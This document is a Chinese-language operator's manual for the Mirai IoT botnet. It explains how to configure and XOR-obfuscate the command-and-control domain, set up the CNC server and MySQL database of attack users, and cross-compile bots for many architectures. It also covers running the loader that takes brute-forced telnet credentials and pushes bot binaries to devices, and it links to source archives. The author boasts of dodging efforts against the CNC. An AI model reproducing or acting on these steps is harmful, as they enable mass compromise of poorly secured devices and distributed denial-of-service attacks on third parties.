Mirai 使用手册

#综述
- 和 CNC 建立连接, bots 会请求解析域名 (resolv.c/resolv.h) 并且连接到域名对应到IP.
- Bots 使用一种高级的 SYN 扫描器 (比qbot快近80倍速度, 少使用接近20倍资源)进行暴力telnet连接. 当发现暴力telnet成功连接, bot 会请求另一个域名上报成功信息. 这是连接到一个单独服务器自动加载到设备的结果.
- 暴力破解结果默认通过48101端口接收. 接收代码在tools目录下的scanListen.go (我曾经试过每秒接收500条 ). 如果采用debug 模式编译, 你能在debug目录看到二进制信息出现.

Mirai 使用一个传播机制自我复制, 但是我称他为 “实时加载”. 总的来说, bots 爆破结果, 发送结果到接收服务器, 将结果发送给加载器. 这个过程 (爆破 -> 接收 -> 加载 -> 爆破) 就是被称为“实时加载”的过程.

加载器能够通过配置多个IP地址解决linux端口限制问题 (可用端口限制, linux 65k连接问题). 我或许同时通过个5 IP有 60k - 70k 出口连接.
* 可能可以使用 用户态 TCP 更好的解决单机65k 问题
https://github.com/pkelsey/libuinet


#Bot配置
Bot 有些配置信息(table.c/table.h) （./mirai/bot/table.h）是混淆过的,  通常在源文件你可以找到大部分的配置信息描述. 然而,  ./mirai/bot/table.c 这个文件当中的一些配置你必须修改过后才能运行.

- TABLE_CNC_DOMAIN -  CNC 域名 -  mirai 对DDoS 攻击防御非常有趣, 其他人试图攻击我的CNC, 但是我更新IP的速度快过他们找到我新IP速度, lol. 无所谓了 :)
- TABLE_CNC_PORT - CNC 端口, 设置成23
- TABLE_SCAN_CB_DOMAIN - 接收器域名，当发现爆破结果, 这个域名用来接收结果
- TABLE_SCAN_CB_PORT - 接收器端口, 设置成48101.

在 ./mirai/tools 可以找到 enc.c 源文件，必须进行编译，编译输出的信息放到 table.c 源文件里

在 mirai 目录外运行
```
./build.sh debug telnet
```
如果你没有配置交叉编译，你可能会看到一些交叉编译错误，这个是正常的，对于工具编译没有什么影响。

现在, 在 ./mirai/debug 你可以看到二进制运行文件 enc. 混淆过的bot连接信息可以使用下面的例子:
```
./debug/enc string fuck.the.police.com
```
The output should look like this
```
XOR'ing 20 bytes of data...
\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22
```

更新例子里的 TABLE_CNC_DOMAIN 值, 用 enc 工具生成的十六进制的一长串的字符串替换掉. 另外, 你看到 "XOR'ing 20 bytes of data".  源文件类似下面这样:

```
add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
```

替换过后源文件类似下面这样：
```
add_entry(TABLE_CNC_DOMAIN, "\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22", 20); // fuck.the.police.com
```

这些配置有些是字符串有些是数字 (uint16 in network order / big endian).

#CNC配置
```
apt-get install mysql-server mysql-client
```
CNC 需要安装数据库才能使用, 使用以下命令:

```
# 从下载开始，所有运行都需要使用一个有权限的用户

apt-get install gcc golang electric-fence

mkdir /etc/xcompile
cd /etc/xcompile

wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2

tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2

rm *.tar.bz2
mv cross-compiler-armv4l armv4l
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc

-- END --

# 设置命令到运行环境的配置文件里 ~/.bashrc

# 交叉编译环境变量
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

# Golang 环境变量
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go

-- END --
```


CNC 初始化数据库:

表结构如下:
CREATE DATABASE mirai;

CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);

CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);

CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);

创建数据库. 然后用下面命令增加用户,
```
INSERT INTO users VALUES (NULL, 'josh-G', 'mypasswordblahah', 0, 0, 0, 0, -1, 1, 30, '');
```

然后打开 ./mirai/cnc/main.go 源文件

编辑这些参数

```
const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = "password"
const DatabaseTable string  = "mirai"
```

这些参数就是数据库地址和账号密码等信息


#安装配置交叉编译器
交叉编译很简单直接参考下面的地址执行，编译完成必须重启或者重新加载.bashrc环境变量

http://pastebin.com/1rRCc3aD

#编译 CNC+Bot
CNC, bot, 相关代码工具:
1) http://santasbigcandycane.cx/mirai.src.zip - ### THESE LINKS WILL NOT LAST FOREVER
![Alt text](http://i.imgur.com/BVc7qJs.png "Optional title")


2) http://santasbigcandycane.cx/loader.src.zip - ### THESE LINKS WILL NOT LAST FOREVER

怎样编译 + CNC
在 mirai 目录, 运行 build.sh 脚本.

```
./build.sh debug telnet
```
debug模式 会输出debug到 ./mirai/debug 目录（连接信息，状态等等）

```
./build.sh release telnet
```
产品模式 会输出版本到  ./mirai/release 目录（连接信息，状态等等）产生的信息更小（大概60k），编译所有运行文件格式 "mirai.$ARCH" 到./mirai/release目录


[size=x-large]编译 Echo 加载器[/size]
Loader reads telnet entries from STDIN in following format:
[code]ip:port user:pass[/code]
会检测有没有 wget 或者  tftp 并且试着下载，如果没有会自动 类似wget的二进制执行文件。
```
./build.sh
```
如果你有一个文件可以用于加载你可以这样使用
```
cat file.txt | ./loader
```

记住 ulimit! 命令设置系统限制

##其它:
懒得翻了... 反正就是遇到问题无人解答，自己解决。
